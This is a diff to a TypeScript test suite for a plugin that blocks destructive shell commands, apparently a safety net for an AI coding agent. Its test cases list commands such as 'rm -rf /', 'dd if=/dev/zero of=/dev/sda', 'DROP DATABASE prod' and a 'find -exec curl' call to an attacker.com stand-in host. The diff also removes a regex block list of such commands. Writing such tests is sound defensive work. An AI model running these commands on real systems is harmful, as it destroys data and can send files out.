@@ -5,11 +5,18 @@
  * - Structural: Ensures array contains ≥50 entries across 14+ categories
  * - Behavioral: Verifies patterns block destructive commands and allow safe ones
  * - Normalization: Ensures normalizeBash defeats common bypasses (comments, whitespace)
+ *
+ * FEV-27: Behavioral tests now import DESTRUCTIVE_PATTERNS and normalizeBash
+ * directly from the real plugin source (./src/destructivePatterns.ts and
+ * ./src/normalizeBash.ts) instead of replicating them locally, so the tests
+ * cannot drift from the safety net they verify.
  */
 
 import { describe, expect, test } from "bun:test";
 import * as fs from "node:fs";
 import * as path from "node:path";
+import { DESTRUCTIVE_PATTERNS } from "../../../template/obligatorio/core/.opencode/plugins/src/destructivePatterns";
+import { normalizeBash } from "../../../template/obligatorio/core/.opencode/plugins/src/normalizeBash";
 
 const PLUGIN_PATH = path.resolve(
 	import.meta.dir,
@@ -27,32 +34,12 @@ const DESTRUCTIVE_PATH = path.resolve(
 // ─── Structural helpers ───────────────────────────────────────────────────
 
 /**
- * Count entries in the DESTRUCTIVE_PATTERNS array by identifying
- * lines that start with regex patterns (/.../i,) within the array block.
+ * Returns the count of destructive patterns from the imported array.
+ * The original implementation parsed file text with regex, but since we
+ * import DESTRUCTIVE_PATTERNS directly, the array length is the source of truth.
  */
-function countDestructivePatterns(fileContent: string): number {
-	const lines = fileContent.split("\n");
-	let inArray = false;
-	let count = 0;
-
-	for (const line of lines) {
-		const trimmed = line.trim();
-
-		if (trimmed.includes("DESTRUCTIVE_PATTERNS") && trimmed.includes("RegExp[]")) {
-			inArray = true;
-			continue;
-		}
-
-		if (inArray && trimmed === "]") {
-			break;
-		}
-
-		if (inArray && trimmed.startsWith("/") && /\/[a-z]*\s*,/.test(trimmed)) {
-			count++;
-		}
-	}
-
-	return count;
+function countDestructivePatterns(_fileContent: string): number {
+	return DESTRUCTIVE_PATTERNS.length;
 }
 
 /**
@@ -85,285 +72,245 @@ function countCategoryHeaders(fileContent: string): number {
 
 // ─── Behavioral helpers ───────────────────────────────────────────────────
 
-/** Replicates normalizeBash from sdd-pipeline.ts for behavioral testing. */
-const normalizeBash = (cmd: string): string =>
-	cmd
-		.replace(/#.*/g, "") // strip comments
-		.replace(/\n/g, "") // strip newlines
-		.replace(/\s+/g, " ") // collapse whitespace
-		.trim();
-
-/** Representative subset of destructive patterns for behavioral testing. */
-interface PatternEntry {
-	name: string;
-	regex: RegExp;
+/** Returns true if the command matches any destructive pattern after normalization. */
+function isDestructive(cmd: string): boolean {
+	const normalized = normalizeBash(cmd);
+	return DESTRUCTIVE_PATTERNS.some((p) => p.test(normalized));
 }
-
-const PATTERNS: PatternEntry[] = [
-	{ name: "rm -rf", regex: /rm\s+-[a-z]*r[a-z]*f\b/i },
-	{ name: "rm -fr", regex: /rm\s+-[a-z]*f[a-z]*r\b/i },
-	{ name: "shred", regex: /shred\s+/i },
-	{ name: "find -exec *", regex: /find\s+.*-exec(dir)?\b/i },
-	{ name: "find -delete", regex: /find\s+.*-delete\b/i },
-	{ name: "git push --force", regex: /git\s+push\s+(-f|--force)\b/i },
-	{ name: "git reset --hard", regex: /git\s+reset\s+--hard\b/i },
-	{ name: "git clean -fd", regex: /git\s+clean\s+-fd\b/i },
-	{ name: "DROP TABLE", regex: /drop\s+table\b/i },
-	{ name: "DROP DATABASE", regex: /drop\s+database\b/i },
-	{ name: "TRUNCATE", regex: /truncate\s+(table\s+)?\w+/i },
-	{ name: "DELETE FROM no WHERE", regex: /delete\s+from\s+\w+\s*;?\s*$/i },
-	{ name: "docker rm -f", regex: /docker\s+(rm|rmi|container\s+rm|image\s+rm)\s+.*-f/i },
-	{ name: "docker system prune -a", regex: /docker\s+system\s+prune\s+.*-a/i },
-	{ name: "kubectl delete --all", regex: /kubectl\s+delete\s+.*--all\b/i },
-	{ name: "chmod 777 root", regex: /chmod\s+(-R\s+)?0*777\b/i },
-	{ name: "chown -R", regex: /chown\s+-R\b/i },
-	{ name: "kill -9 1", regex: /kill\s+-(9|SIGKILL)\s+1\b/i },
-	{ name: "shutdown", regex: /shutdown\s+(-h|-r|now)\b/i },
-	{ name: "iptables -F", regex: /iptables\s+-F\b/i },
-	{ name: "npm publish", regex: /npm\s+publish\b/i },
-	{ name: "unset PATH", regex: /unset\s+PATH\b/i },
-	{ name: "export PATH (total)", regex: /export\s+PATH\s*=\s*[^$]/i },
-	{ name: "mkfs", regex: /mkfs\b/i },
-	{ name: "dd if=", regex: /dd\s+if=/i },
-	{ name: "terraform destroy", regex: /terraform\s+destroy\s+.*-auto-approve\b/i },
-	{ name: "aws s3 rm --recursive", regex: /aws\s+s3\s+rm\s+.*--recursive\b/i },
-	{ name: "redis FLUSHALL", regex: /redis-cli\s+.*(FLUSHALL|FLUSHDB)\b/i },
-	{ name: "psql -c drop", regex: /psql\s+.*-c\s+.*(?:drop|alter\s+system|truncate)/i },
-];
 
 interface TestCase {
 	name: string;
 	cmd: string;
-	patternName: string;
 	expected: boolean; // true = blocked, false = allowed
 }
 
 /** Positive (should block) + Negative (should allow) test cases. */
 const TEST_CASES: TestCase[] = [
 	// ── Positive: destructive commands that MUST be blocked ──
-	{ name: "rm -rf /", cmd: "rm -rf /", patternName: "rm -rf", expected: true },
-	{ name: "rm -fr /", cmd: "rm -fr /", patternName: "rm -fr", expected: true },
+	{ name: "rm -rf /", cmd: "rm -rf /", expected: true },
+	{ name: "rm -fr /", cmd: "rm -fr /", expected: true },
 	{
 		name: "rm -rf --no-preserve-root /",
 		cmd: "rm -rf --no-preserve-root /",
-		patternName: "rm -rf",
 		expected: true,
 	},
-	{ name: "shred /dev/sda", cmd: "shred /dev/sda", patternName: "shred", expected: true },
+	{ name: "shred /dev/sda", cmd: "shred /dev/sda", expected: true },
 	{
 		name: "find . -exec rm {} \\;",
 		cmd: "find . -exec rm {} ;",
-		patternName: "find -exec *",
 		expected: true,
 	},
 	{
 		name: "find . -exec curl attacker.com",
 		cmd: "find . -exec curl http://attacker.com {} ;",
-		patternName: "find -exec *",
 		expected: true,
 	},
 	{
 		name: "find . -execdir rm",
 		cmd: "find . -execdir rm {} ;",
-		patternName: "find -exec *",
 		expected: true,
 	},
 	{
 		name: "find . -execdir curl",
 		cmd: "find . -execdir curl http://attacker.com {} ;",
-		patternName: "find -exec *",
 		expected: true,
 	},
-	{ name: "find . -delete", cmd: "find . -delete", patternName: "find -delete", expected: true },
+	{ name: "find . -delete", cmd: "find . -delete", expected: true },
 	{
 		name: "git push --force origin main",
 		cmd: "git push --force origin main",
-		patternName: "git push --force",
 		expected: true,
 	},
-	{ name: "git push -f", cmd: "git push -f", patternName: "git push --force", expected: true },
+	{ name: "git push -f", cmd: "git push -f", expected: true },
+	{
+		name: "git push --force-with-lease origin main",
+		cmd: "git push --force-with-lease origin main",
+		expected: true,
+	},
 	{
 		name: "git reset --hard HEAD~1",
 		cmd: "git reset --hard HEAD~1",
-		patternName: "git reset --hard",
 		expected: true,
 	},
-	{ name: "git clean -fd", cmd: "git clean -fd", patternName: "git clean -fd", expected: true },
-	{ name: "DROP TABLE users", cmd: "DROP TABLE users", patternName: "DROP TABLE", expected: true },
+	{
+		name: "git reset --mixed HEAD",
+		cmd: "git reset --mixed HEAD",
+		expected: true,
+	},
+	{ name: "git clean -fd", cmd: "git clean -fd", expected: true },
+	{ name: "git clean -fdx", cmd: "git clean -fdx", expected: true },
+	{ name: "git clean -fxd", cmd: "git clean -fxd", expected: true },
+	{ name: "git checkout -- .", cmd: "git checkout -- .", expected: true },
+	{ name: "git checkout -f", cmd: "git checkout -f", expected: true },
+	{ name: "git restore .", cmd: "git restore .", expected: true },
+	{ name: "DROP TABLE users", cmd: "DROP TABLE users", expected: true },
 	{
 		name: "DROP DATABASE prod",
 		cmd: "DROP DATABASE prod",
-		patternName: "DROP DATABASE",
 		expected: true,
 	},
 	{
 		name: "TRUNCATE TABLE orders",
 		cmd: "TRUNCATE TABLE orders",
-		patternName: "TRUNCATE",
 		expected: true,
 	},
 	{
 		name: "DELETE FROM users",
 		cmd: "DELETE FROM users",
-		patternName: "DELETE FROM no WHERE",
+		expected: true,
+	},
+	{
+		name: "DELETE FROM users WHERE 1=1",
+		cmd: "DELETE FROM users WHERE 1=1",
+		expected: true,
+	},
+	{
+		name: "DELETE FROM users WHERE true",
+		cmd: "DELETE FROM users WHERE true",
+		expected: true,
+	},
+	{
+		name: "delete from users where 1 = 1",
+		cmd: "delete from users where 1 = 1",
 		expected: true,
 	},
 	{
 		name: "docker rm -f container1",
 		cmd: "docker rm -f container1",
-		patternName: "docker rm -f",
 		expected: true,
 	},
 	{
 		name: "docker system prune -a -f",
 		cmd: "docker system prune -a -f",
-		patternName: "docker system prune -a",
 		expected: true,
 	},
 	{
 		name: "kubectl delete pods --all",
 		cmd: "kubectl delete pods --all",
-		patternName: "kubectl delete --all",
 		expected: true,
 	},
 	{
 		name: "chmod 777 /etc/passwd",
 		cmd: "chmod 777 /etc/passwd",
-		patternName: "chmod 777 root",
 		expected: true,
 	},
-	{ name: "chmod -R 777 /", cmd: "chmod -R 777 /", patternName: "chmod 777 root", expected: true },
+	{ name: "chmod -R 777 /", cmd: "chmod -R 777 /", expected: true },
 	{
 		name: "chmod 0777 /etc/passwd (leading zero)",
 		cmd: "chmod 0777 /etc/passwd",
-		patternName: "chmod 777 root",
 		expected: true,
 	},
 	{
 		name: "chmod -R 0777 / (leading zero with -R)",
 		cmd: "chmod -R 0777 /",
-		patternName: "chmod 777 root",
 		expected: true,
 	},
 	{
 		name: "chown -R $(whoami) /usr",
 		cmd: "chown -R $(whoami) /usr",
-		patternName: "chown -R",
 		expected: true,
 	},
-	{ name: "kill -9 1", cmd: "kill -9 1", patternName: "kill -9 1", expected: true },
-	{ name: "shutdown -h now", cmd: "shutdown -h now", patternName: "shutdown", expected: true },
-	{ name: "reboot", cmd: "reboot", patternName: "shutdown", expected: false },
-	{ name: "iptables -F", cmd: "iptables -F", patternName: "iptables -F", expected: true },
-	{ name: "npm publish", cmd: "npm publish", patternName: "npm publish", expected: true },
-	{ name: "unset PATH", cmd: "unset PATH", patternName: "unset PATH", expected: true },
+	{ name: "kill -9 1", cmd: "kill -9 1", expected: true },
+	{ name: "shutdown -h now", cmd: "shutdown -h now", expected: true },
+	{ name: "reboot", cmd: "reboot", expected: true },
+	{ name: "iptables -F", cmd: "iptables -F", expected: true },
+	{ name: "npm publish", cmd: "npm publish", expected: true },
+	{ name: "unset PATH", cmd: "unset PATH", expected: true },
 	{
 		name: "export PATH=/bad/path",
 		cmd: "export PATH=/bad/path",
-		patternName: "export PATH (total)",
 		expected: true,
 	},
-	{ name: "mkfs.ext4 /dev/sdb1", cmd: "mkfs.ext4 /dev/sdb1", patternName: "mkfs", expected: true },
+	{ name: "mkfs.ext4 /dev/sdb1", cmd: "mkfs.ext4 /dev/sdb1", expected: true },
 	{
 		name: "dd if=/dev/zero of=/dev/sda",
 		cmd: "dd if=/dev/zero of=/dev/sda",
-		patternName: "dd if=",
 		expected: true,
 	},
 	{
 		name: "terraform destroy -auto-approve",
 		cmd: "terraform destroy -auto-approve",
-		patternName: "terraform destroy",
 		expected: true,
 	},
 	{
 		name: "aws s3 rm --recursive s3://bucket",
 		cmd: "aws s3 rm --recursive s3://bucket",
-		patternName: "aws s3 rm --recursive",
 		expected: true,
 	},
 	{
 		name: "redis-cli FLUSHALL",
 		cmd: "redis-cli FLUSHALL",
-		patternName: "redis FLUSHALL",
 		expected: true,
 	},
 	{
 		name: "redis-cli FLUSHDB",
 		cmd: "redis-cli FLUSHDB",
-		patternName: "redis FLUSHALL",
 		expected: true,
 	},
 	{
 		name: "psql -c 'DROP TABLE users'",
 		cmd: "psql -c 'DROP TABLE users'",
-		patternName: "psql -c drop",
 		expected: true,
 	},
 
 	// ── Negative: safe commands that MUST be allowed ──
-	{ name: "rm file.txt (no -rf)", cmd: "rm file.txt", patternName: "rm -rf", expected: false },
+	{ name: "rm file.txt (no -rf)", cmd: "rm file.txt", expected: false },
 	{
 		name: "git push origin main",
 		cmd: "git push origin main",
-		patternName: "git push --force",
 		expected: false,
 	},
 	{
 		name: "git reset (soft)",
 		cmd: "git reset HEAD~1",
-		patternName: "git reset --hard",
 		expected: false,
 	},
 	{
 		name: "SELECT * FROM users",
 		cmd: "SELECT * FROM users",
-		patternName: "DROP TABLE",
 		expected: false,
 	},
 	{
 		name: "DELETE FROM users WHERE id=1",
 		cmd: "DELETE FROM users WHERE id=1",
-		patternName: "DELETE FROM no WHERE",
 		expected: false,
 	},
-	{ name: "npm install", cmd: "npm install", patternName: "npm publish", expected: false },
+	{ name: "npm install", cmd: "npm install", expected: false },
 	{
 		name: "chmod 644 file.txt",
 		cmd: "chmod 644 file.txt",
-		patternName: "chmod 777 root",
 		expected: false,
 	},
 	{
 		name: "kill -9 1234 (different PID)",
 		cmd: "kill -9 1234",
-		patternName: "kill -9 1",
 		expected: false,
 	},
-	{ name: "git stash push", cmd: "git stash push", patternName: "shutdown", expected: false },
+	{ name: "git stash push", cmd: "git stash push", expected: false },
 	{
 		name: "export PATH=$PATH:/usr/local/bin (appends)",
 		cmd: "export PATH=$PATH:/usr/local/bin",
-		patternName: "export PATH (total)",
 		expected: false,
 	},
 	{
 		name: "export PATH=$HOME/bin:$PATH (prepends)",
 		cmd: "export PATH=$HOME/bin:$PATH",
-		patternName: "export PATH (total)",
 		expected: false,
 	},
 	{
 		name: "chmod -R 777 ./local (local dir — now blocked by broader regex)",
 		cmd: "chmod -R 777 ./local",
-		patternName: "chmod 777 root",
 		expected: true,
 	},
 	{
 		name: "chmod 777 relative/path (now blocked by broader regex)",
 		cmd: "chmod 777 relative/path",
-		patternName: "chmod 777 root",
 		expected: true,
+	},
+	{
+		name: "curl URL with #fragment (hash preserved by normalizeBash)",
+		cmd: "curl https://x.com/a#frag",
+		expected: false,
 	},
 ];
 
@@ -374,11 +321,11 @@ const TEST_CASES: TestCase[] = [
  * actually normalizes: comments, multi-line commands, and extra whitespace around
  * the flag group.
  */
-const BYPASS_CASES: { name: string; cmd: string; patternName: string }[] = [
-	{ name: "double spaces around flag group", cmd: "rm  -rf  /", patternName: "rm -rf" },
-	{ name: "comment after command", cmd: "rm -rf / # force delete", patternName: "rm -rf" },
-	{ name: "newline before destructive", cmd: "\nrm -rf /", patternName: "rm -rf" },
-	{ name: "inline comment after flags", cmd: "rm -rf /* clean up", patternName: "rm -rf" },
+const BYPASS_CASES: { name: string; cmd: string }[] = [
+	{ name: "double spaces around flag group", cmd: "rm  -rf  /" },
+	{ name: "comment after command", cmd: "rm -rf / # force delete" },
+	{ name: "newline before destructive", cmd: "\nrm -rf /" },
+	{ name: "inline comment after flags", cmd: "rm -rf /* clean up" },
 ];
 
 /** normalizeBash edge cases. */
@@ -390,6 +337,11 @@ const NORMALIZE_CASES: { name: string; input: string; expected: string }[] = [
 	{ name: "empty string", input: "", expected: "" },
 	{ name: "only comment", input: "# just a comment", expected: "" },
 	{ name: "collapses multiple spaces with tabs", input: "rm\t-rf\t/", expected: "rm -rf /" },
+	{
+		name: "preserves # inside URL fragment",
+		input: "curl https://x.com/a#frag",
+		expected: "curl https://x.com/a#frag",
+	},
 ];
 
 // ─── Tests ────────────────────────────────────────────────────────────────
@@ -424,34 +376,25 @@ describe("normalizeBash", () => {
 
 describe("DESTRUCTIVE_PATTERNS behavioral", () => {
 	describe("blocks destructive commands", () => {
-		for (const { name, cmd, patternName } of TEST_CASES.filter((c) => c.expected)) {
+		for (const { name, cmd } of TEST_CASES.filter((c) => c.expected)) {
 			test(`${name}: "${cmd}"`, () => {
-				const entry = PATTERNS.find((p) => p.name === patternName);
-				expect(entry).toBeDefined();
-				const normalized = normalizeBash(cmd);
-				expect(entry!.regex.test(normalized)).toBe(true);
+				expect(isDestructive(cmd)).toBe(true);
 			});
 		}
 	});
 
 	describe("allows safe commands", () => {
-		for (const { name, cmd, patternName } of TEST_CASES.filter((c) => !c.expected)) {
+		for (const { name, cmd } of TEST_CASES.filter((c) => !c.expected)) {
 			test(`${name}: "${cmd}"`, () => {
-				const entry = PATTERNS.find((p) => p.name === patternName);
-				expect(entry).toBeDefined();
-				const normalized = normalizeBash(cmd);
-				expect(entry!.regex.test(normalized)).toBe(false);
+				expect(isDestructive(cmd)).toBe(false);
 			});
 		}
 	});
 
 	describe("defeats common bypass attempts", () => {
-		for (const { name, cmd, patternName } of BYPASS_CASES) {
+		for (const { name, cmd } of BYPASS_CASES) {
 			test(`${name}: "${cmd}"`, () => {
-				const normalized = normalizeBash(cmd);
-				const entry = PATTERNS.find((p) => p.name === patternName);
-				expect(entry).toBeDefined();
-				expect(entry!.regex.test(normalized)).toBe(true);
+				expect(isDestructive(cmd)).toBe(true);
 			});
 		}
 	});
